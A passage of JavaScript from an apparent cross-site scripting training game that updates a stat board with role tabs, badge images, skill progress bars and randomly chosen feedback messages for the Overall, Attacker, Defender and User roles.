        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(OverallSimZoneSkillsValue);

        const affirmativeFeedbackOverallCompleted = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackOverallCompleted.innerText = affirmativeOverallFeedbackList[Math.floor(Math.random() * affirmativeOverallFeedbackList.length)];
        affirmativeFeedbackOverallCompleted.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;visibility:visible;");

        const levelFeedbackOverallRolesCompleted = document.getElementById('playerstatboard-feedback-box-text');
        levelFeedbackOverallRolesCompleted.innerText = affirmativeOverallLearningFeedbackList[Math.floor(Math.random() * affirmativeOverallLearningFeedbackList.length)];
        levelFeedbackOverallRolesCompleted.setAttribute("style", "position:fixed;top:35%;left:27%;width: 50%;color: #f9f6f6;font-size: 1.6vw;z-index: 1;font-weight: bold;visibility:visible;");
    } else if (role_name == "Overall") {
        document.getElementById("overallTabSelected").style.backgroundColor = "red";
        document.getElementById("attackerTabSelected").style.backgroundColor = "black";
        document.getElementById("defenderTabSelected").style.backgroundColor = "black";
        document.getElementById("userTabSelected").style.backgroundColor = "black";

        document.getElementById("tabImage").src = "images/badges/overall-skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(OverallSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(OverallSimZoneSkillsValue);

        const affirmativeFeedbackOverallInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackOverallInGame.innerText = affirmativeOverallProgressFeedbackList[Math.floor(Math.random() * affirmativeOverallProgressFeedbackList.length)];
        affirmativeFeedbackOverallInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;visibility:visible;");

        const levelFeedbackOverallInGame = document.getElementById('playerstatboard-feedback-box-text');
        levelFeedbackOverallInGame.innerText = affirmativeRoleProgressFeedbackList[Math.floor(Math.random() * affirmativeRoleProgressFeedbackList.length)];
        levelFeedbackOverallInGame.setAttribute("style", "position:fixed;top:35%;left:27%;width: 50%;color: #f9f6f6;font-size: 1.6vw;z-index: 1;font-weight: bold;visibility:visible;");

    }

    if (role_name == "Attacker" && rolesPlayed.includes('Attacker')) {
        document.getElementById("overallTabSelected").style.backgroundColor = "black";
        document.getElementById("attackerTabSelected").style.backgroundColor = "red";
        document.getElementById("defenderTabSelected").style.backgroundColor = "black";
        document.getElementById("userTabSelected").style.backgroundColor = "black";

        document.getElementById("tabImage").src = "images/badges/Attacker-Skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(AttackerReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(AttackerReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(AttackerStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(AttackerStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(AttackerDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(AttackerDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(AttackerSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(AttackerSimZoneSkillsValue);

        const personalizedFeedbackAttacker = document.getElementById('playerstatboard-feedback-box-text');
        personalizedFeedbackAttacker.innerText = tabSelectedAttacker;
        personalizedFeedbackAttacker.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 0.92vw;z-index: 1;font-weight: bold;visibility:visible;");

        const affirmativeFeedbackAttacker = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackAttacker.innerText = tabSelectedAffirmativeAttacker;
        affirmativeFeedbackAttacker.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;visibility:visible;");

    } else if (role_name == "Attacker") {
        document.getElementById("overallTabSelected").style.backgroundColor = "black";
        document.getElementById("attackerTabSelected").style.backgroundColor = "red";
        document.getElementById("defenderTabSelected").style.backgroundColor = "black";
        document.getElementById("userTabSelected").style.backgroundColor = "black";

        document.getElementById("tabImage").src = "images/badges/Attacker-Skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(AttackerReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(AttackerReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(AttackerStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(AttackerStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(AttackerDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(AttackerDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(AttackerSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(AttackerSimZoneSkillsValue);

        const affirmativeFeedbackAttackerInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackAttackerInGame.innerText = affirmativeAttackerProgressFeedbackList[Math.floor(Math.random() * affirmativeAttackerProgressFeedbackList.length)];
        affirmativeFeedbackAttackerInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

        const personalizedFeedbackAttackerInGame = document.getElementById('playerstatboard-feedback-box-text');
        personalizedFeedbackAttackerInGame.innerText = levelAttackerProgressFeedbackList[Math.floor(Math.random() * levelAttackerProgressFeedbackList.length)];
        personalizedFeedbackAttackerInGame.setAttribute("style", "position:fixed;top:48%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");

    }

    if (role_name == "Defender" && rolesPlayed.includes('Defender')) {
        document.getElementById("overallTabSelected").style.backgroundColor = "black";
        document.getElementById("attackerTabSelected").style.backgroundColor = "black";
        document.getElementById("defenderTabSelected").style.backgroundColor = "red";
        document.getElementById("userTabSelected").style.backgroundColor = "black";

        document.getElementById("tabImage").src = "images/badges/Defender-skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(DefenderReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(DefenderReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(DefenderStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(DefenderStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(DefenderDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(DefenderDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(DefenderSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(DefenderSimZoneSkillsValue);

        const personalizedFeedbackDefender = document.getElementById('playerstatboard-feedback-box-text');
        personalizedFeedbackDefender.innerText = tabSelectedDefender;
        personalizedFeedbackDefender.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 0.92vw;z-index: 1;font-weight: bold;visibility:visible;");

        const affirmativeFeedbackDefender = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackDefender.innerText = tabSelectedAffirmativeDefender;
        affirmativeFeedbackDefender.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;visibility:visible;");
    } else if (role_name == "Defender") {
        document.getElementById("overallTabSelected").style.backgroundColor = "black";
        document.getElementById("attackerTabSelected").style.backgroundColor = "black";
        document.getElementById("defenderTabSelected").style.backgroundColor = "red";
        document.getElementById("userTabSelected").style.backgroundColor = "black";

        document.getElementById("tabImage").src = "images/badges/Defender-skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(DefenderReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(DefenderReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(DefenderStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(DefenderStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(DefenderDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(DefenderDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(DefenderSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(DefenderSimZoneSkillsValue);

        const affirmativeFeedbackDefenderInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackDefenderInGame.innerText = affirmativeDefenderProgressFeedbackList[Math.floor(Math.random() * affirmativeDefenderProgressFeedbackList.length)];
        affirmativeFeedbackDefenderInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

        const personalizedFeedbackDefenderInGame = document.getElementById('playerstatboard-feedback-box-text');
        personalizedFeedbackDefenderInGame.innerText = levelDefenderProgressFeedbackList[Math.floor(Math.random() * levelDefenderProgressFeedbackList.length)];
        personalizedFeedbackDefenderInGame.setAttribute("style", "position:fixed;top:48%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");
    }

    if (role_name == "User" && rolesPlayed.includes('User')) {
        document.getElementById("overallTabSelected").style.backgroundColor = "black";
        document.getElementById("attackerTabSelected").style.backgroundColor = "black";
        document.getElementById("defenderTabSelected").style.backgroundColor = "black";
        document.getElementById("userTabSelected").style.backgroundColor = "red";

        document.getElementById("tabImage").src = "images/badges/User-skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(UserReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(UserReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(UserStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(UserStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(UserDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(UserDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(UserSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(UserSimZoneSkillsValue);

        const personalizedFeedbackUser = document.getElementById('playerstatboard-feedback-box-text');
        personalizedFeedbackUser.innerText = tabSelectedUser;
        personalizedFeedbackUser.setAttribute("style", "position:fixed;top:30%;left:27%;width: 50%;color: #f9f6f6;font-size: 0.92vw;z-index: 1;font-weight: bold;visibility:visible;");

        const affirmativeFeedbackUser = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackUser.innerText = tabSelectedAffirmativeUser;
        affirmativeFeedbackUser.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;visibility:visible;");

    } else if (role_name == "User") {
        document.getElementById("overallTabSelected").style.backgroundColor = "black";
        document.getElementById("attackerTabSelected").style.backgroundColor = "black";
        document.getElementById("defenderTabSelected").style.backgroundColor = "black";
        document.getElementById("userTabSelected").style.backgroundColor = "red";

        document.getElementById("tabImage").src = "images/badges/User-skills.png";

        document.getElementById("Ref-XSS-Skills-Value-stat-board").innerText = Math.ceil(UserReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS-overall-statboard").value = Math.ceil(UserReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value-stat-board").innerText = Math.ceil(UserStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS-stat-board").value = Math.ceil(UserStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value-stat-board").innerText = Math.ceil(UserDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS-stat-board").value = Math.ceil(UserDOMBasedSkillsValue);
        document.getElementById("Sim-Zone-Skills-Value-stat-board").innerText = Math.ceil(UserSimZoneSkillsValue);
        document.getElementById("video-progress-Sim-Zone-Skills-Progress-stat-board").value = Math.ceil(UserSimZoneSkillsValue);

        const affirmativeFeedbackUserInGame = document.getElementById('playerstatboard-skills-affirmative-box-text');
        affirmativeFeedbackUserInGame.innerText = affirmativeUserProgressFeedbackList[Math.floor(Math.random() * affirmativeUserProgressFeedbackList.length)];
        affirmativeFeedbackUserInGame.setAttribute("style", "position:fixed;top:10%;left:30%;width:45%;font-size:1.6vw;z-index:2;font-weight:bold;word-wrap:break-word;");

        const personalizedFeedbackUserInGame = document.getElementById('playerstatboard-feedback-box-text');
        personalizedFeedbackUserInGame.innerText = levelUserProgressFeedbackList[Math.floor(Math.random() * levelUserProgressFeedbackList.length)];
        personalizedFeedbackUserInGame.setAttribute("style", "position:fixed;top:48%;left:27%;width: 50%;color: #f9f6f6;font-size: 2vw;z-index: 1;font-weight: bold;");

    }

}